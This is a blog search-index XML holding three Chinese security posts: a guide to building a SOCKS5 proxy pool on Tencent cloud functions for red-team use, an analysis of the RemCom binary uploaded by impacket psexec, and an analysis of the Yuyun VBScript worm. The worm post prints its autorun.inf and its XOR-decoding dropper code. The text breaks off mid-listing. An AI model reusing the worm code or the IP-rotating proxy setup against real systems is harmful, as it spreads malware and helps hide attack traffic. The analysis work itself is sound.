<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>使用腾讯云函数(SCF)搭建免费代理池</title>
    <link href="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/"/>
    <url>/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
    
    <content type="html"><![CDATA[<p>以前曾经用过<a href="https://github.com/jhao104/proxy_pool">proxy_pool</a>搭过代理池，但是大部分爬来的代理都不怎么好用就果断放弃了</p><p>最近看使用一篇文章感觉挺靠谱的，也临近HVV，就自己搭着试了试，效果也不错</p><p><a href="https://blog.csdn.net/qq_45244158/article/details/122945753">https://blog.csdn.net/qq_45244158/article/details/122945753</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数（Serverless Cloud Function，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。<br>无服务器（Serverless）不是表示没有服务器，而表示在使用 Serverless 时，我们无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。使用云函数（SCF）时，我们只需使用平台支持的语言（Python、Node.js、PHP、Golang、Java 及 Custom Runtime）编写代码，云计算厂商将完全管理底层计算资源，包括服务器 CPU、内存、网络和其他配置&#x2F;资源维护、代码部署、弹性伸缩、负载均衡、安全升级、资源运行情况监控等。总结云函数的三个特性就是：</p><ol><li>多出口</li><li>调用时创建执行</li><li>无需服务器承载</li></ol><h3 id="代理池的构建原理"><a href="#代理池的构建原理" class="headerlink" title="代理池的构建原理"></a>代理池的构建原理</h3><p>云函数（SCF）可通过 API 网关触发器进行触发，接受来自客户端的数据，并将请求转发出去。也就是说利用云厂商提供的云函数（函数计算）功能，将客户端的HTTP请求转发，由于云函数拥有非常多的出口IP，也就不怕封IP了</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/%E6%B5%81%E9%87%8F%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="流量示意图"></p><h2 id="搭建socks5代理池"><a href="#搭建socks5代理池" class="headerlink" title="搭建socks5代理池"></a><strong>搭建socks5代理池</strong></h2><p>项目地址<a href="https://github.com/culprits/SCFProxy">https://github.com/culprits/SCFProxy</a></p><h3 id="云函数函数配置"><a href="#云函数函数配置" class="headerlink" title="云函数函数配置"></a>云函数函数配置</h3><p>登录 <a href="https://console.cloud.tencent.com/scf/list">腾讯云函数服务</a>，新建云函数</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100034803.png" alt="image-20220623100034803"></p><p>选择在线编辑，粘贴代码\SOCKS5\src\server.py的内容</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> select<br><br><br>bridge_ip = <span class="hljs-string">&quot;&quot;</span>                      <span class="hljs-comment">#vps IP</span><br>bridge_port = <span class="hljs-number">1234</span>                  <span class="hljs-comment">#vps开启监听的端口</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_handler</span>(<span class="hljs-params">event, context</span>):<br>    data = json.loads(event[<span class="hljs-string">&quot;body&quot;</span>])<br>    out = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    out.connect((data[<span class="hljs-string">&quot;host&quot;</span>], data[<span class="hljs-string">&quot;port&quot;</span>]))<br><br>    bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    bridge.connect((bridge_ip, bridge_port))<br>    bridge.send(data[<span class="hljs-string">&quot;uid&quot;</span>].encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select.select([out, bridge], [], [])<br>        <span class="hljs-keyword">if</span> out <span class="hljs-keyword">in</span> readable:<br>            data = out.recv(<span class="hljs-number">4096</span>)<br>            bridge.send(data)<br>        <span class="hljs-keyword">if</span> bridge <span class="hljs-keyword">in</span> readable:<br>            data = bridge.recv(<span class="hljs-number">4096</span>)<br>            out.send(data)<br></code></pre></td></tr></table></figure><p>点击完成，在函数管理-函数配置中将执行超时时间改为最大900，即一个SOCKS5长连接最多维持15min</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100450988.png" alt="image-20220623100450988"></p><p>创建触发器，触发方式为API网关触发</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100749983.png" alt="image-20220623100749983"></p><p>复制访问路径备用</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623100915281.png" alt="image-20220623100915281"></p><h3 id="VPS服务端配置"><a href="#VPS服务端配置" class="headerlink" title="VPS服务端配置"></a>VPS服务端配置</h3><p>注：其实可以不使用vps服务端，直接调用云函数实现代理，但是我正好有vps而且这样还挺方便就没有研究这个方向，没有vps的伙伴可以研究一下</p><p>需要环境：要求 Python &gt;&#x3D; 3.8</p><p>我的vps正好是CentOS 7 默认的python版本是python2.7.5，就顺带装了一下python3.8.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">依赖包</span><br>yum -y groupinstall &quot;Development tools&quot;<br> <br>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel<br><span class="hljs-meta prompt_">#</span><span class="language-bash">下载 Python3</span><br>wget https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建文件夹</span><br>mkdir /usr/local/python3 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">解压编译安装</span><br>tar -xvJf  Python-3.8.1.tar.xz<br>cd Python-3.8.1<br>./configure --prefix=/usr/local/python3<br>make &amp;&amp; make install<br><span class="hljs-meta prompt_">#</span><span class="language-bash">给个软链</span><br>ln -s /usr/local/python3/bin/python3 /usr/bin/python3<br>ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3<br></code></pre></td></tr></table></figure><p>将socks_client文件夹，包含requirements.txt，上传到vps上</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623102324382.png" alt="image-20220623102324382"></p><p>执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv .venv<br>source .venv/bin/activate<br>pip3 install -r requirements.txt<br><br>在后台执行<br>screen python3 socks5.py -u &quot;API访问路径&quot; -bp 监听端口 -sp socks端口 --user 用户名 --passwd 密码<br></code></pre></td></tr></table></figure><p>打开上面两个端口的防火墙，包括vps防火墙以及vps服务商的防火墙设置</p><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>下载Proxifier代理软件，内网渗透、流量代理良品</p><p><em>我使用的是<a href="https://www.litiaotiao.com/proxifier.html">https://www.litiaotiao.com/proxifier.html</a></em>，<strong>推荐正版，小心病毒</strong></p><p>在配置文件-代理服务器，填写vps地址、端口、协议Socks5、用户名及密码</p><p><img src="/2022/06/23/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AF%E4%BA%91%E5%87%BD%E6%95%B0-SCF-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0/image-20220623103106679.png" alt="image-20220623103106679"></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="image-20220623103332665.png" alt="image-20220623103332665" style="zoom:80%;" /><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>等vps过期不续费了，研究一下无vps代理，目前为至这个还很好用，谢谢大佬</p><p>另外，腾讯云函数要开始收费了，是不是要改战<a href="https://www.huaweicloud.com/product/functiongraph.html">华为云函数工作流</a>，函数前100万次&#x2F;月调用免费</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理池</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>psexec生成的RemCom木马分析</title>
    <link href="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="psexec介绍"><a href="#psexec介绍" class="headerlink" title="psexec介绍"></a>psexec介绍</h2><p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a> 是用于处理网络协议的Python类的集合,该集合包含了渗透测试中常见的工具种类,包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。</p><p>工具描述详见<a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p><p>psexec.py 是impacket套件中进行远程连接，执行shell命令，并返回处理输出结果的命令行工具。</p><p>原理：通过smb协议上传一个服务程序（RemCom）到C:\Windows（ADMIN$）目录下，服务程序通过管道进行后续命令执行的输入输出</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">python psexec.py     //查看帮助<br></code></pre></td></tr></table></figure><img src="image-20220616150341207.png" alt="image-20220616150341207" style="zoom: 80%;" /><p>语法:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">python psexec.py  <span class="hljs-comment">[<span class="hljs-comment">[domain/]</span>username<span class="hljs-comment">[:password]</span>@]</span>&lt;targetName or address&gt;<br></code></pre></td></tr></table></figure><p>例如：</p><img src="image-20220616152838197.png" alt="image-20220616152838197" style="zoom:80%;" /><p>脚本默认的编码是utf-8，而window操作系统默认编码格式是gbk，所以防止出现乱码可以使用 <em>-codec gbk</em></p><p>从上图可以看到脚本上传了 xQlLMMCc.exe文件，这个文件就是<a href="https://github.com/kavika13/RemCom">RemCom</a>开源木马，主要负责创建管道，执行shell命令。在命令执行完成后（exit），该文件以及相应服务就会被删除</p><h2 id="Remcom木马分析"><a href="#Remcom木马分析" class="headerlink" title="Remcom木马分析"></a>Remcom木马分析</h2><p>从流量中捕获的文件被设备标记为黑客工具，分析时使用IDA进行分析，并未分析源码</p><table><thead><tr><th>文件名</th><th>ViSbRFqi.exe</th></tr></thead><tbody><tr><td>大小</td><td>56320 字节</td></tr><tr><td>MD5</td><td>6983F7001DE10F4D19FC2D794C3EB534</td></tr><tr><td>SHA1</td><td>23873BF2670CF64C2440058130548D4E4DA412DD</td></tr><tr><td>CRC32</td><td>1263E86C</td></tr></tbody></table><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20220616161244191.png" alt="image-20220616161244191"></p><p>样本未加壳，编写语言为C++，编译时间2012年8月9日</p><p>使用IDA pro进行静态反编译</p><p>样本运行后先提升自身为管理员权限，然后创建服务“RemComSvc”，服务主线程实现木马主体功能，服务停止后删除创建的服务，清除入侵痕迹</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E4%B8%BB%E4%BD%93%E4%BB%A3%E7%A0%81.png" alt="样本主体代码"></p><p>木马的主体功能在服务主线程中执行，先将服务设置为执行状态，然后开启服务功能线程</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%9C%8D%E5%8A%A1%E4%B8%BB%E7%BA%BF%E7%A8%8B%E4%BB%A3%E7%A0%81.png" alt="服务主线程代码"></p><p>通信线程池用于处理传入的RemCom.exe请求，即执行主控端shell命令行，“RemComSvc”服务停止后，删除这个服务</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E4%B8%BB%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81.png" alt="主线程服务执行代码"></p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E6%B8%85%E9%99%A4%E6%9C%8D%E5%8A%A1%E4%BB%A3%E7%A0%81.png" alt="清除服务代码"></p><p>创建一个命名的双通管道，名字是<a href="file://./pipe/RemCom_communicaton">\.\pipe\RemCom_communicaton</a>，等待客户端连接</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E9%80%9A%E4%BF%A1%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%BB%A3%E7%A0%81.png" alt="通信线程池代码"></p><p>读取管道中的客户端请求，创建进程执行客户端命令，并将执行结果写入管道</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E4%BB%A3%E7%A0%81.png" alt="客户端请求处理代码"></p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81.png" alt="客户端命令执行代码"></p><h2 id="样本关联拓线"><a href="#样本关联拓线" class="headerlink" title="样本关联拓线"></a>样本关联拓线</h2><p>经过流量分析，发现RemCom文件是由另一个svchost.exe挖矿病毒产生的</p><p>有关代码如下</p><p><img src="/2022/06/17/psexec%E7%94%9F%E6%88%90%E7%9A%84RemCom%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20220616164138234.png" alt="image-20220616164138234"></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RemCom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Yuyun脚本蠕虫分析</title>
    <link href="/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/14/Yuyun%E8%84%9A%E6%9C%AC%E8%A0%95%E8%99%AB%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>捕获到一个纯vbs脚本病毒</p><img src="image-20220614134519359.png" alt="样本截图" style="zoom:50%;" /><p>包含一个autorun.inf文件和一个Thumb.db文件，两个文件均为隐藏的受保护的操作系统文件（只读）。</p><p><strong>autorun.inf MD5:080d8ef2430b49f991b460abf4af5156</strong></p><p><strong>Thumb.db MD5:0a456ffff1d3fd522457c187ebcf41e4</strong></p><h2 id="autorun-inf"><a href="#autorun-inf" class="headerlink" title="autorun.inf"></a>autorun.inf</h2><p><a href="https://baike.baidu.com/item/autorun.inf">autorun.inf</a>常见于可移动介质传播蠕虫病毒，其作用是允许在双击磁盘时自动运行指定的某个文件。</p><p>注：在2011年2月8日发布的安全公告KB967940中，微软对Windows自动运行功能进行了最新升级，限定Windows XP、Windows Server 2003、Vista（Vista是到Win7的一个过渡系统）和Windows Server 2008平台上的自动运行功能仅支持CD和DVD媒体。当用户使用包含autorun.inf文件的USB设备、网络共享或其它非CD&#x2F;DVD媒体时，系统不会执行自动运行。</p><p>autorun.inf 内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[autorun]</span><br><span class="hljs-attr">open</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\<span class="hljs-attr">open</span>=Open<br>shell\open\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br>shell\open\<span class="hljs-attr">Default</span>=<span class="hljs-number">1</span><br>shell\<span class="hljs-attr">explore</span>=Explore<br>shell\explore\<span class="hljs-attr">Command</span>=WScript.exe //e:VBScript thumb.db auto<br></code></pre></td></tr></table></figure><p>即自动调用WScript.exe以VBS脚本来执行thumb.db文件，执行参数为auto</p><p>由此可见，该样本应该属于蠕虫病毒，并且较老，传播能力一般</p><h2 id="Thumb-db"><a href="#Thumb-db" class="headerlink" title="Thumb.db"></a>Thumb.db</h2><p>thumb.db为vbs脚本病毒，主要代码如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-comment">&#x27;www.muslimah.or.id;==================================== my name:Yuyun 1.0</span><br><br><span class="hljs-comment">&#x27; ============================</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">Dim</span> fso, ws<br><span class="hljs-keyword">Set</span> fso = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;scripting.filesystemobject&quot;</span>)<br><span class="hljs-keyword">Set</span> ws = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;wscript.Shell&quot;</span>)<br><span class="hljs-keyword">Set</span> sh = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.application&quot;</span>)<br>Q=WScript.ScriptFullName           <span class="hljs-comment">&#x27;运行的脚本文件的完全路径</span><br>tmp=fso.GetSpecialFolder(<span class="hljs-number">2</span>)<br>tn=fso.GetTempName                 <span class="hljs-comment">&#x27;返回随机生成的临时文件或文件夹的名称</span><br>tmpt=tmp+<span class="hljs-string">&quot;\&quot;</span>+tn                    <span class="hljs-comment">&#x27;临时文件绝对路径</span><br><span class="hljs-keyword">Set</span> swt=WScript.Arguments          <span class="hljs-comment">&#x27;参数集合</span><br><span class="hljs-keyword">If</span> swt.Count&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">Then</span><br>status=swt(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">If</span> status=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-keyword">Then</span><br>sh.Explore <span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-number">3</span>)       <span class="hljs-comment">&#x27;参数是auto返回脚本文件所在盘符，如C:/</span><br><span class="hljs-keyword">Else</span> <br>status=<span class="hljs-built_in">Left</span>(WScript.ScriptFullName,<span class="hljs-built_in">Len</span>(WScript.ScriptFullName)-<span class="hljs-built_in">Len</span>(WScript.ScriptName))+status     <span class="hljs-comment">&#x27;否则以参数为文件夹名</span><br><span class="hljs-keyword">If</span> fso.FolderExists(status) <span class="hljs-keyword">Then</span>    <span class="hljs-comment">&#x27;存在打开文件夹</span><br>sh.Explore status             <br><span class="hljs-keyword">Else</span><br>fso.CreateFolder status          <span class="hljs-comment">&#x27;不存在，创建打开文件夹</span><br>sh.Explore status<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Else</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">Set</span> QQ=fso.GetFile(Q)<br><span class="hljs-keyword">Set</span> Q1=QQ.OpenAsTextStream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)    <span class="hljs-comment">&#x27;打开脚本文件，返回一个TextStream对象</span><br>isiQ=Q1.Read(QQ.Size)<br>Q1.close<br>t1=<span class="hljs-built_in">InStr</span>(<span class="hljs-number">1</span>,isiQ,<span class="hljs-string">&quot;Yuyun^_^~!~2008&quot;</span>+<span class="hljs-string">&quot; &gt;&gt;&gt;&quot;</span>,<span class="hljs-number">0</span>)+<span class="hljs-number">18</span>   <span class="hljs-comment">&#x27;在运行的脚本文件中查询指定字符串</span><br>isiQ=<span class="hljs-built_in">Right</span>(isiQ,<span class="hljs-built_in">Len</span>(isiQ)-t1)                    <span class="hljs-comment">&#x27;返回Yuyun^_^~!~2008 &gt;&gt;&gt;后的字符串</span><br>hsl=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">For</span> v=<span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-built_in">Len</span>(isiQ)                             <span class="hljs-comment">&#x27;解码得到的字符串</span><br>t=<span class="hljs-built_in">Asc</span>(<span class="hljs-built_in">Mid</span>(isiQ,v,<span class="hljs-number">1</span>))<br>hsl=hsl+<span class="hljs-built_in">Chr</span>(t <span class="hljs-keyword">Xor</span> <span class="hljs-number">7</span>)<br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">If</span> fso.FileExists(tmpt) <span class="hljs-keyword">Then</span> fso.GetFile(tmpt).Attributes=<span class="hljs-number">0</span><br><span class="hljs-keyword">Set</span> temporary=fso.OpenTextFile(tmpt,<span class="hljs-number">2</span>,<span class="hljs-literal">True</span>,<span class="hljs-number">0</span>)     <span class="hljs-comment">&#x27;打开生成的临时文件</span><br>temporary.Write hsl                               <span class="hljs-comment">&#x27;写入解码得到的字符串</span><br>temporary.Close<br>ws.Run <span class="hljs-string">&quot;WScript.exe //e:VBScript &quot;</span>+tmpt+<span class="hljs-string">&quot; &quot;&quot;&quot;</span>+Q+<span class="hljs-string">&quot;&quot;&quot;&quot;</span>         <span class="hljs-comment">&#x27;以VBScrip执行生成的tmp文件</span><br><br> <span class="hljs-comment">&#x27; Yuyun^_^~!~2008 &gt;&gt;&gt; :::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><br><br> <span class="hljs-comment">&#x27;J~&#x27;ifjb&#x27;=&#x27;^r~ri&#x27;Qbu&#x27;6)7</span><br><br> <span class="hljs-comment">&#x27;N&#x27;mrts&#x27;pfiif&#x27;tbb&#x27;bqbu~&#x27;`nuk&#x27;khhlt&#x27;indb+&#x27;ebssbu+&#x27;lnict&#x27;btwbdnfkk~&#x27;f&#x27;jhtkbj&#x27;`nuk</span><br><br> <span class="hljs-comment">&#x27;e~=&#x27;Fihi~jhrtb&#x27;ni&#x27;Mfsnj+&#x27;Ihqbjebu&#x27;577?</span><br><br> <span class="hljs-comment">&#x27;Pobi&#x27;N&#x27;ahric&#x27;ihsoni`&#x27;ebfrs~&#x27;bktb)))&#x27;fic&#x27;sobi&#x27;N&#x27;puhsb&#x27;sont&#x27;tdunws&#x27;ahu&#x27;fkk</span><br><br> :::::::::::::::::::::::::::::::::::::::::::::::::::::::<br> (以下省略)<br></code></pre></td></tr></table></figure><p>可以看出代码的主要功能是，解码、释放并执行包含的经过混淆的vbs脚本文件</p><p>生成的vbs文件，如下：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 